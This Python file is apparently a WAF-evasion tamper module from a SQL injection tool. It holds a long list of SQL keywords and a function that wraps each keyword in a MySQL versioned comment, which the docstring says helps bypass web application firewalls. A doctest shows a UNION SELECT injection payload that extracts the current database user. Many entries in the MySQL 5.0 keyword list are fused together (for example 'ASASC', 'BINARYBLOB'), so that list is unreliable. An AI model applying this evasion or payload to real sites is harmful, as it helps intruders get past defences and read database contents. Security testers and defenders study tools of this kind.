#!/usr/bin/env python
"""
# SQLGO License - Version 1.4

Copyright (C) 2023-2024 AliMirmohammad

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.


"""
import re
import os

IGNORE_SPACE_AFFECTED_KEYWORDS = ("CAST", "COUNT", "EXTRACT", "GROUP_CONCAT", "MAX", "MID", "MIN", "SESSION_USER", "SUBSTR", "SUBSTRING", "SUM", "SYSTEM_USER", "TRIM")
keywords = """

ABSOLUTE
ACTION
ADD
ALL
ALLOCATE
ALTER
AND
ANY
ARE
AS
ASC
ASSERTION
AT
AUTHORIZATION
AVG
BEGIN
BETWEEN
BIT
BIT_LENGTH
BOTH
BY
CALL
CASCADE
CASCADED
CASE
CAST
CATALOG
CHAR
CHAR_LENGTH
CHARACTER
CHARACTER_LENGTH
CHECK
CLOSE
COALESCE
COLLATE
COLLATION
COLUMN
COMMIT
CONDITION
CONNECT
CONNECTION
CONSTRAINT
CONSTRAINTS
CONTAINS
CONTINUE
CONVERT
CORRESPONDING
COUNT
CREATE
CROSS
CURRENT
CURRENT_DATE
CURRENT_PATH
CURRENT_TIME
CURRENT_TIMESTAMP
CURRENT_USER
CURSOR
DATE
DAY
DEALLOCATE
DEC
DECIMAL
DECLARE
DEFAULT
DEFERRABLE
DEFERRED
DELETE
DESC
DESCRIBE
DESCRIPTOR
DETERMINISTIC
DIAGNOSTICS
DISCONNECT
DISTINCT
DO
DOMAIN
DOUBLE
DROP
ELSE
ELSEIF
END
ESCAPE
EXCEPT
EXCEPTION
EXEC
EXECUTE
EXISTS
EXIT
EXTERNAL
EXTRACT
FALSE
FETCH
FIRST
FLOAT
FOR
FOREIGN
FOUND
FROM
FULL
FUNCTION
GET
GLOBAL
GO
GOTO
GRANT
GROUP
HANDLER
HAVING
HOUR
IDENTITY
IF
IMMEDIATE
IN
INDICATOR
INITIALLY
INNER
INOUT
INPUT
INSENSITIVE
INSERT
INT
INTEGER
INTERSECT
INTERVAL
INTO
IS
ISOLATION
JOIN
KEY
LANGUAGE
LAST
LEADING
LEAVE
LEFT
LEVEL
LIKE
LOCAL
LOOP
LOWER
MATCH
MAX
MIN
MINUTE
MODULE
MONTH
NAMES
NATIONAL
NATURAL
NCHAR
NEXT
NO
NOT
NULL
NULLIF
NUMERIC
OCTET_LENGTH
OF
ON
ONLY
OPEN
OPTION
OR
ORDER
OUT
OUTER
OUTPUT
OVERLAPS
PAD
PARAMETER
PARTIAL
PATH
POSITION
PRECISION
PREPARE
PRESERVE
PRIMARY
PRIOR
PRIVILEGES
PROCEDURE
READ
REAL
REFERENCES
RELATIVE
REPEAT
RESIGNAL
RESTRICT
RETURN
RETURNS
REVOKE
RIGHT
ROLLBACK
ROUTINE
ROWS
SCHEMA
SCROLL
SECOND
SECTION
SELECT
SESSION
SESSION_USER
SET
SIGNAL
SIZE
SMALLINT
SOME
SPACE
SPECIFIC
SQL
SQLCODE
SQLERROR
SQLEXCEPTION
SQLSTATE
SQLWARNING
SUBSTRING
SUM
SYSTEM_USER
TABLE
TEMPORARY
THEN
TIME
TIMESTAMP
TIMEZONE_HOUR
TIMEZONE_MINUTE
TO
TRAILING
TRANSACTION
TRANSLATE
TRANSLATION
TRIM
TRUE
UNDO
UNION
UNIQUE
UNKNOWN
UNTIL
UPDATE
UPPER
USAGE
USER
USING
VALUE
VALUES
VARCHAR
VARYING
VIEW
WHEN
WHENEVER
WHERE
WHILE
WITH
WORK
WRITE
YEAR
ZONE

# MySQL 5.0 keywords (reference: http://dev.mysql.com/doc/refman/5.0/en/reserved-words.html)

ADD
ALL
ALTER
ANALYZE
AND
ASASC
ASENSITIVE
BEFORE
BETWEEN
BIGINT
BINARYBLOB
BOTH
BY
CALL
CASCADE
CASECHANGE
CAST
CHAR
CHARACTER
CHECK
COLLATE
COLUMN
CONCAT
CONDITIONCONSTRAINT
CONTINUE
CONVERT
CREATE
CROSS
CURRENT_DATE
CURRENT_TIMECURRENT_TIMESTAMP
CURRENT_USER
CURSOR
DATABASE
DATABASES
DAY_HOUR
DAY_MICROSECONDDAY_MINUTE
DAY_SECOND
DEC
DECIMAL
DECLARE
DEFAULTDELAYED
DELETE
DESC
DESCRIBE
DETERMINISTIC
DISTINCTDISTINCTROW
DIV
DOUBLE
DROP
DUAL
EACH
ELSEELSEIF
ENCLOSED
ESCAPED
EXISTS
EXIT
EXPLAIN
FALSEFETCH
FLOAT
FLOAT4
FLOAT8
FOR
FORCE
FOREIGNFROM
FULLTEXT
GRANT
GROUP
HAVING
HIGH_PRIORITYHOUR_MICROSECOND
HOUR_MINUTE
HOUR_SECOND
IF
IFNULL
IGNORE
ININDEX
INFILE
INNER
INOUT
INSENSITIVE
INSERT
INTINT1
INT2
INT3
INT4
INT8
INTEGER
INTERVALINTO
IS
ISNULL
ITERATE
JOIN
KEY
KEYS
KILLLEADING
LEAVE
LEFT
LIKE
LIMIT
LINESLOAD
LOCALTIME
LOCALTIMESTAMP
LOCK
LONG
LONGBLOBLONGTEXT
LOOP
LOW_PRIORITY
MATCH
MEDIUMBLOB
MEDIUMINT
MEDIUMTEXTMIDDLEINT
MINUTE_MICROSECOND
MINUTE_SECOND
MOD
MODIFIES
NATURAL
NOTNO_WRITE_TO_BINLOG
NULL
NUMERIC
ON
OPTIMIZE
OPTION
OPTIONALLYOR
ORDER
OUT
OUTER
OUTFILE
PRECISIONPRIMARY
PROCEDURE
PURGE
READ
READS
REALREFERENCES
REGEXP
RELEASE
RENAME
REPEAT
REPLACE
REQUIRERESTRICT
RETURN
REVOKE
RIGHT
RLIKE
SCHEMA
SCHEMASSECOND_MICROSECOND
SELECT
SENSITIVE
SEPARATOR
SET
SHOW
SMALLINTSONAME
SPATIAL
SPECIFIC
SQL
SQLEXCEPTION
SQLSTATESQLWARNING
SQL_BIG_RESULT
SQL_CALC_FOUND_ROWS
SQL_SMALL_RESULT
SSL
STARTINGSTRAIGHT_JOIN
TABLE
TERMINATED
THEN
TINYBLOB
TINYINT
TINYTEXTTO
TRAILING
TRIGGER
TRUE
UNDO
UNION
UNIQUEUNLOCK
UNSIGNED
UPDATE
USAGE
USE
USING
UTC_DATEUTC_TIME
UTC_TIMESTAMP
VALUES
VARBINARY
VARCHAR
VARCHARACTERVARYING
VERSION
WHEN
WHERE
WHILE
WITH
WRITEXOR
YEAR_MONTH
ZEROFILL

# MySQL 8.0 keywords (reference: https://dev.mysql.com/doc/refman/8.0/en/keywords.html)

ACCESSIBLE
ACCOUNT
ACTION
ACTIVE
ADD
ADMIN
AFTER
AGAINST
AGGREGATE
ALGORITHM
ALL
ALTER
ALWAYS
ANALYSE
ANALYZE
AND
ANY
ARRAY
AS
ASC
ASCII
ASENSITIVE
AT
ATTRIBUTE
AUTHENTICATION
AUTOEXTEND_SIZE
AUTO_INCREMENT
AVG
AVG_ROW_LENGTH
BACKUP
BEFORE
BEGIN
BETWEEN
BIGINT
BINARY
BINLOG
BIT
BLOB
BLOCK
BOOL
BOOLEAN
BOTH
BTREE
BUCKETS
BULK
BY
BYTE
CACHE
CALL
CASCADE
CASCADED
CASE
CATALOG_NAME
CHAIN
CHALLENGE_RESPONSE
CHANGE
CHANGED
CHANNEL
CHAR
CHARACTER
CHARSET
CHECK
CHECKSUM
CIPHER
CLASS_ORIGIN
CLIENT
CLONE
CLOSE
COALESCE
CODE
COLLATE
COLLATION
COLUMN
COLUMNS
COLUMN_FORMAT
COLUMN_NAME
COMMENT
COMMIT
COMMITTED
COMPACT
COMPLETION
COMPONENT
COMPRESSED
COMPRESSION
CONCURRENT
CONDITION
CONNECTION
CONSISTENT
CONSTRAINT
CONSTRAINT_CATALOG
CONSTRAINT_NAME
CONSTRAINT_SCHEMA
CONTAINS
CONTEXT
CONTINUE
CONVERT
CPU
CREATE
CROSS
CUBE
CUME_DIST
CURRENT
CURRENT_DATE
CURRENT_TIME
CURRENT_TIMESTAMP
CURRENT_USER
CURSOR
CURSOR_NAME
DATA
DATABASE
DATABASES
DATAFILE
DATE
DATETIME
DAY
DAY_HOUR
DAY_MICROSECOND
DAY_MINUTE
DAY_SECOND
DEALLOCATE
DEC
DECIMAL
DECLARE
DEFAULT
DEFAULT_AUTH
DEFINER
DEFINITION
DELAYED
DELAY_KEY_WRITE
DELETE
DENSE_RANK
DESC
DESCRIBE
DESCRIPTION
DES_KEY_FILE
DETERMINISTIC
DIAGNOSTICS
DIRECTORY
DISABLE
DISCARD
DISK
DISTINCT
DISTINCTROW
DIV
DO
DOUBLE
DROP
DUAL
DUMPFILE
DUPLICATE
DYNAMIC
EACH
ELSE
ELSEIF
EMPTY
ENABLE
ENCLOSED
ENCRYPTION
END
ENDS
ENFORCED
ENGINE
ENGINES
ENGINE_ATTRIBUTE
ENUM
ERROR
ERRORS
ESCAPE
ESCAPED
EVENT
EVENTS
EVERY
EXCEPT
EXCHANGE
EXCLUDE
EXECUTE
EXISTS
EXIT
EXPANSION
EXPIRE
EXPLAIN
EXPORT
EXTENDED
EXTENT_SIZE
FACTOR
FAILED_LOGIN_ATTEMPTS
FALSE
FAST
FAULTS
FETCH
FIELDS
FILE
FILE_BLOCK_SIZE
FILTER
FINISH
FIRST
FIRST_VALUE
FIXED
FLOAT
FLOAT4
FLOAT8
FLUSH
FOLLOWING
FOLLOWS
FOR
FORCE
FOREIGN
FORMAT
FOUND
FROM
FULL
FULLTEXT
FUNCTION
GENERAL
GENERATE
GENERATED
GEOMCOLLECTION
GEOMETRY
GEOMETRYCOLLECTION
GET
GET_FORMAT
GET_MASTER_PUBLIC_KEY
GET_SOURCE_PUBLIC_KEY
GLOBAL
GRANT
GRANTS
GROUP
GROUPING
GROUPS
GROUP_REPLICATION
GTID_ONLY
HANDLER
HASH
HAVING
HELP
HIGH_PRIORITY
HISTOGRAM
HISTORY
HOST
HOSTS
HOUR
HOUR_MICROSECOND
HOUR_MINUTE
HOUR_SECOND
IDENTIFIED
IF
IGNORE
IGNORE_SERVER_IDS
IMPORT
IN
INACTIVE
INDEX
INDEXES
INFILE
INITIAL
INITIAL_SIZE
INITIATE
INNER
INOUT
INSENSITIVE
INSERT
INSERT_METHOD
INSTALL
INSTANCE
INT
INT1
INT2
INT3
INT4
INT8
INTEGER
INTERSECT
INTERVAL
INTO
INVISIBLE
INVOKER
IO
IO_AFTER_GTIDS
IO_BEFORE_GTIDS
IO_THREAD
IPC
IS
ISOLATION
ISSUER
ITERATE
JOIN
JSON
JSON_TABLE
JSON_VALUE
KEY
KEYRING
KEYS
KEY_BLOCK_SIZE
KILL
LAG
LANGUAGE
LAST
LAST_VALUE
LATERAL
LEAD
LEADING
LEAVE
LEAVES
LEFT
LESS
LEVEL
LIKE
LIMIT
LINEAR
LINES
LINESTRING
LIST
LOAD
LOCAL
LOCALTIME
LOCALTIMESTAMP
LOCK
LOCKED
LOCKS
LOGFILE
LOGS
LONG
LONGBLOB
LONGTEXT
LOOP
LOW_PRIORITY
MASTER
MASTER_AUTO_POSITION
MASTER_BIND
MASTER_COMPRESSION_ALGORITHMS
MASTER_CONNECT_RETRY
MASTER_DELAY
MASTER_HEARTBEAT_PERIOD
MASTER_HOST
MASTER_LOG_FILE
MASTER_LOG_POS
MASTER_PASSWORD
MASTER_PORT
MASTER_PUBLIC_KEY_PATH
MASTER_RETRY_COUNT
MASTER_SERVER_ID
MASTER_SSL
MASTER_SSL_CA
MASTER_SSL_CAPATH
MASTER_SSL_CERT
MASTER_SSL_CIPHER
MASTER_SSL_CRL
MASTER_SSL_CRLPATH
MASTER_SSL_KEY
MASTER_SSL_VERIFY_SERVER_CERT
MASTER_TLS_CIPHERSUITES
MASTER_TLS_VERSION
MASTER_USER
MASTER_ZSTD_COMPRESSION_LEVEL
MATCH
MAXVALUE
MAX_CONNECTIONS_PER_HOUR
MAX_QUERIES_PER_HOUR
MAX_ROWS
MAX_SIZE
MAX_UPDATES_PER_HOUR
MAX_USER_CONNECTIONS
MEDIUM
MEDIUMBLOB
MEDIUMINT
MEDIUMTEXT
MEMBER
MEMORY
MERGE
MESSAGE_TEXT
MICROSECOND
MIDDLEINT
MIGRATE
MINUTE
MINUTE_MICROSECOND
MINUTE_SECOND
MIN_ROWS
MOD
MODE
MODIFIES
MODIFY
MONTH
MULTILINESTRING
MULTIPOINT
MULTIPOLYGON
MUTEX
MYSQL_ERRNO
NAME
NAMES
NATIONAL
NATURAL
NCHAR
NDB
NDBCLUSTER
NESTED
NETWORK_NAMESPACE
NEVER
NEW
NEXT
NO
NODEGROUP
NONE
NOT
NOWAIT
NO_WAIT
NO_WRITE_TO_BINLOG
NTH_VALUE
NTILE
NULL
NULLS
NUMBER
NUMERIC
NVARCHAR
OF
OFF
OFFSET
OJ
OLD
ON
ONE
ONLY
OPEN
OPTIMIZE
OPTIMIZER_COSTS
OPTION
OPTIONAL
OPTIONALLY
OPTIONS
OR
ORDER
ORDINALITY
ORGANIZATION
OTHERS
OUT
OUTER
OUTFILE
OVER
OWNER
PACK_KEYS
PAGE
PARSER
PARTIAL
PARTITION
PARTITIONING
PARTITIONS
PASSWORD_LOCK_TIME
PATH
PERCENT_RANK
PERSIST
PERSIST_ONLY
PHASE
PLUGIN
PLUGINS
PLUGIN_DIR
POINT
POLYGON
PORT
PRECEDES
PRECEDING
PRECISION
PREPARE
PRESERVE
PREV
PRIMARY
PRIVILEGES
PRIVILEGE_CHECKS_USER
PROCEDURE
PROCESS
PROCESSLIST
PROFILE
PROFILES
PROXY
PURGE
QUARTER
QUERY
QUICK
RANDOM
RANGE
RANK
READ
READS
READ_ONLY
READ_WRITE
REAL
REBUILD
RECOVER
RECURSIVE
REDOFILE
REDO_BUFFER_SIZE
REDUNDANT
REFERENCE
REFERENCES
REGEXP
REGISTRATION
RELAY
RELAYLOG
RELAY_LOG_FILE
RELAY_LOG_POS
RELAY_THREAD
RELEASE
RELOAD
REMOTE
REMOVE
RENAME
REORGANIZE
REPAIR
REPEAT
REPEATABLE
REPLACE
REPLICA
REPLICAS
REPLICATE_DO_DB
REPLICATE_DO_TABLE
REPLICATE_IGNORE_DB
REPLICATE_IGNORE_TABLE
REPLICATE_REWRITE_DB
REPLICATE_WILD_DO_TABLE
REPLICATE_WILD_IGNORE_TABLE
REPLICATION
REQUIRE
REQUIRE_ROW_FORMAT
RESET
RESIGNAL
RESOURCE
RESPECT
RESTART
RESTORE
RESTRICT
RESUME
RETAIN
RETURN
RETURNED_SQLSTATE
RETURNING
RETURNS
REUSE
REVERSE
REVOKE
RIGHT
RLIKE
ROLE
ROLLBACK
ROLLUP
ROTATE
ROUTINE
ROW
ROWS
ROW_COUNT
ROW_FORMAT
ROW_NUMBER
RTREE
SAVEPOINT
SCHEDULE
SCHEMA
SCHEMAS
SCHEMA_NAME
SECOND
SECONDARY
SECONDARY_ENGINE
SECONDARY_ENGINE_ATTRIBUTE
SECONDARY_LOAD
SECONDARY_UNLOAD
SECOND_MICROSECOND
SECURITY
SELECT
SENSITIVE
SEPARATOR
SERIAL
SERIALIZABLE
SERVER
SESSION
SET
SHARE
SHOW
SHUTDOWN
SIGNAL
SIGNED
SIMPLE
SKIP
SLAVE
SLOW
SMALLINT
SNAPSHOT
SOCKET
SOME
SONAME
SOUNDS
SOURCE
SOURCE_AUTO_POSITION
SOURCE_BIND
SOURCE_COMPRESSION_ALGORITHMS
SOURCE_CONNECT_RETRY
SOURCE_DELAY
SOURCE_HEARTBEAT_PERIOD
SOURCE_HOST
SOURCE_LOG_FILE
SOURCE_LOG_POS
SOURCE_PASSWORD
SOURCE_PORT
SOURCE_PUBLIC_KEY_PATH
SOURCE_RETRY_COUNT
SOURCE_SSL
SOURCE_SSL_CA
SOURCE_SSL_CAPATH
SOURCE_SSL_CERT
SOURCE_SSL_CIPHER
SOURCE_SSL_CRL
SOURCE_SSL_CRLPATH
SOURCE_SSL_KEY
SOURCE_SSL_VERIFY_SERVER_CERT
SOURCE_TLS_CIPHERSUITES
SOURCE_TLS_VERSION
SOURCE_USER
SOURCE_ZSTD_COMPRESSION_LEVEL
SPATIAL
SPECIFIC
SQL
SQLEXCEPTION
SQLSTATE
SQLWARNING
SQL_AFTER_GTIDS
SQL_AFTER_MTS_GAPS
SQL_BEFORE_GTIDS
SQL_BIG_RESULT
SQL_BUFFER_RESULT
SQL_CACHE
SQL_CALC_FOUND_ROWS
SQL_NO_CACHE
SQL_SMALL_RESULT
SQL_THREAD
SQL_TSI_DAY
SQL_TSI_HOUR
SQL_TSI_MINUTE
SQL_TSI_MONTH
SQL_TSI_QUARTER
SQL_TSI_SECOND
SQL_TSI_WEEK
SQL_TSI_YEAR
SRID
SSL
STACKED
START
STARTING
STARTS
STATS_AUTO_RECALC
STATS_PERSISTENT
STATS_SAMPLE_PAGES
STATUS
STOP
STORAGE
STORED
STRAIGHT_JOIN
STREAM
STRING
SUBCLASS_ORIGIN
SUBJECT
SUBPARTITION
SUBPARTITIONS
SUPER
SUSPEND
SWAPS
SWITCHES
SYSTEM
TABLE
TABLES
TABLESPACE
TABLE_CHECKSUM
TABLE_NAME
TEMPORARY
TEMPTABLE
TERMINATED
TEXT
THAN
THEN
THREAD_PRIORITY
TIES
TIME
TIMESTAMP
TIMESTAMPADD
TIMESTAMPDIFF
TINYBLOB
TINYINT
TINYTEXT
TLS
TO
TRAILING
TRANSACTION
TRIGGER
TRIGGERS
TRUE
TRUNCATE
TYPE
TYPES
UNBOUNDED
UNCOMMITTED
UNDEFINED
UNDO
UNDOFILE
UNDO_BUFFER_SIZE
UNICODE
UNINSTALL
UNION
UNIQUE
UNKNOWN
UNLOCK
UNREGISTER
UNSIGNED
UNTIL
UPDATE
UPGRADE
URL
USAGE
USE
USER
USER_RESOURCES
USE_FRM
USING
UTC_DATE
UTC_TIME
UTC_TIMESTAMP
VALIDATION
VALUE
VALUES
VARBINARY
VARCHAR
VARCHARACTER
VARIABLES
VARYING
VCPU
VIEW
VIRTUAL
VISIBLE
WAIT
WARNINGS
WEEK
WEIGHT_STRING
WHEN
WHERE
WHILE
WINDOW
WITH
WITHOUT
WORK
WRAPPER
WRITE
X509
XA
XID
XML
XOR
YEAR
YEAR_MONTH
ZEROFILL
ZONE

# PostgreSQL|SQL:2016|SQL:2011 reserved words (reference: https://www.postgresql.org/docs/current/sql-keywords-appendix.html)

ABS
ACOS
ALL
ALLOCATE
ALTER
ANALYSE
ANALYZE
AND
ANY
ARE
ARRAY
ARRAY_AGG
ARRAY_MAX_CARDINALITY
AS
ASC
ASENSITIVE
ASIN
ASYMMETRIC
AT
ATAN
ATOMIC
AUTHORIZATION
AVG
BEGIN
BEGIN_FRAME
BEGIN_PARTITION
BETWEEN
BIGINT
BINARY
BLOB
BOOLEAN
BOTH
BY
CALL
CALLED
CARDINALITY
CASCADED
CASE
CAST
CEIL
CEILING
CHAR
CHARACTER
CHARACTER_LENGTH
CHAR_LENGTH
CHECK
CLASSIFIER
CLOB
CLOSE
COALESCE
COLLATE
COLLATION
COLLECT
COLUMN
COMMIT
CONCURRENTLY
CONDITION
CONNECT
CONSTRAINT
CONTAINS
CONVERT
COPY
CORR
CORRESPONDING
COS
COSH
COUNT
COVAR_POP
COVAR_SAMP
CREATE
CROSS
CUBE
CUME_DIST
CURRENT
CURRENT_CATALOG
CURRENT_DATE
CURRENT_DEFAULT_TRANSFORM_GROUP
CURRENT_PATH
CURRENT_ROLE
CURRENT_ROW
CURRENT_SCHEMA
CURRENT_TIME
CURRENT_TIMESTAMP
CURRENT_TRANSFORM_GROUP_FOR_TYPE
CURRENT_USER
CURSOR
CYCLE
DATALINK
DATE
DAY
DEALLOCATE
DEC
DECFLOAT
DECIMAL
DECLARE
DEFAULT
DEFERRABLE
DEFINE
DELETE
DENSE_RANK
DEREF
DESC
DESCRIBE
DETERMINISTIC
DISCONNECT
DISTINCT
DLNEWCOPY
DLPREVIOUSCOPY
DLURLCOMPLETE
DLURLCOMPLETEONLY
DLURLCOMPLETEWRITE
DLURLPATH
DLURLPATHONLY
DLURLPATHWRITE
DLURLSCHEME
DLURLSERVER
DLVALUE
DO
DOUBLE
DROP
DYNAMIC
EACH
ELEMENT
ELSE
EMPTY
END
END-EXEC
END_FRAME
END_PARTITION
EQUALS
ESCAPE
EVERY
EXCEPT
EXEC
EXECUTE
EXISTS
EXP
EXTERNAL
EXTRACT
FALSE
FETCH
FILTER
FIRST_VALUE
FLOAT
FLOOR
FOR
FOREIGN
FRAME_ROW
FREE
FREEZE
FROM
FULL
FUNCTION
FUSION
GET
GLOBAL
GRANT
GROUP
GROUPING
GROUPS
HAVING
HOLD
HOUR
IDENTITY
ILIKE
IMPORT
IN
INDICATOR
INITIAL
INITIALLY
INNER
INOUT
INSENSITIVE
INSERT
INT
INTEGER
INTERSECT
INTERSECTION
INTERVAL
INTO
IS
ISNULL
JOIN
JSON_ARRAY
JSON_ARRAYAGG
JSON_EXISTS
JSON_OBJECT
JSON_OBJECTAGG
JSON_QUERY
JSON_TABLE
JSON_TABLE_PRIMITIVE
JSON_VALUE
LAG
LANGUAGE
LARGE
LAST_VALUE
LATERAL
LEAD
LEADING
LEFT
LIKE
LIKE_REGEX
LIMIT
LISTAGG
LN
LOCAL
LOCALTIME
LOCALTIMESTAMP
LOG
LOG10
LOWER
MATCH
MATCHES
MATCH_NUMBER
MATCH_RECOGNIZE
MAX
MEASURES
MEMBER
MERGE
METHOD
MIN
MINUTE
MOD
MODIFIES
MODULE
MONTH
MULTISET
NATIONAL
NATURAL
NCHAR
NCLOB
NEW
NO
NONE
NORMALIZE
NOT
NOTNULL
NTH_VALUE
NTILE
NULL
NULLIF
NUMERIC
OCCURRENCES_REGEX
OCTET_LENGTH
OF
OFFSET
OLD
OMIT
ON
ONE
ONLY
OPEN
OR
ORDER
OUT
OUTER
OVER
OVERLAPS
OVERLAY
PARAMETER
PARTITION
PATTERN
PER
PERCENT
PERCENTILE_CONT
PERCENTILE_DISC
PERCENT_RANK
PERIOD
PERMUTE
PLACING
PORTION
POSITION
POSITION_REGEX
POWER
PRECEDES
PRECISION
PREPARE
PRIMARY
PROCEDURE
PTF
RANGE
RANK
READS
REAL
RECURSIVE
REF
REFERENCES
REFERENCING
REGR_AVGX
REGR_AVGY
REGR_COUNT
REGR_INTERCEPT
REGR_R2
REGR_SLOPE
REGR_SXX
REGR_SXY
REGR_SYY
RELEASE
RESULT
RETURN
RETURNING
RETURNS
REVOKE
RIGHT
ROLLBACK
ROLLUP
ROW
ROWS
ROW_NUMBER
RUNNING
SAVEPOINT
SCOPE
SCROLL
SEARCH
SECOND
SEEK
SELECT
SENSITIVE
SESSION_USER
SET
SHOW
SIMILAR
SIN
SINH
SKIP
SMALLINT
SOME
SPECIFIC
SPECIFICTYPE
SQL
SQLEXCEPTION
SQLSTATE
SQLWARNING
SQRT
START
STATIC
STDDEV_POP
STDDEV_SAMP
SUBMULTISET
SUBSET
SUBSTRING
SUBSTRING_REGEX
SUCCEEDS
SUM
SYMMETRIC
SYSTEM
SYSTEM_TIME
SYSTEM_USER
TABLE
TABLESAMPLE
TAN
TANH
THEN
TIME
TIMESTAMP
TIMEZONE_HOUR
TIMEZONE_MINUTE
TO
TRAILING
TRANSLATE
TRANSLATE_REGEX
TRANSLATION
TREAT
TRIGGER
TRIM
TRIM_ARRAY
TRUE
TRUNCATE
UESCAPE
UNION
UNIQUE
UNKNOWN
UNMATCHED
UNNEST
UPDATE
UPPER
USER
USING
VALUE
VALUES
VALUE_OF
VARBINARY
VARCHAR
VARIADIC
VARYING
VAR_POP
VAR_SAMP
VERBOSE
VERSIONING
WHEN
WHENEVER
WHERE
WIDTH_BUCKET
WINDOW
WITH
WITHIN
WITHOUT
XML
XMLAGG
XMLATTRIBUTES
XMLBINARY
XMLCAST
XMLCOMMENT
XMLCONCAT
XMLDOCUMENT
XMLELEMENT
XMLEXISTS
XMLFOREST
XMLITERATE
XMLNAMESPACES
XMLPARSE
XMLPI
XMLQUERY
XMLSERIALIZE
XMLTABLE
XMLTEXT
XMLVALIDATE
YEAR

# Misc

ORD
MID


"""

def tamper(payload, **kwargs):
    """
    Encloses each keyword with (MySQL) versioned comment

    Requirement:
        * MySQL >= 5.1.13

    Tested against:
        * MySQL 5.1.56, 5.5.11

    Notes:
        * Useful to bypass several web application firewalls when the
          back-end database management system is MySQL

    >>> tamper('1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#')
    '1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS*//*!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))#'
    """

    def process(match):
        word = match.group('word')
        if word.upper() in keywords and word.upper() not in IGNORE_SPACE_AFFECTED_KEYWORDS:
            return match.group().replace(word, "/*!%s*/" % word)
        else:
            return match.group()

    retVal = payload

    if payload:
        retVal = re.sub(r"(?<=\W)(?P<word>[A-Za-z_]+)(?=\W|\Z)", process, retVal)
        retVal = retVal.replace(" /*!", "/*!").replace("*/ ", "*/")

    return retVal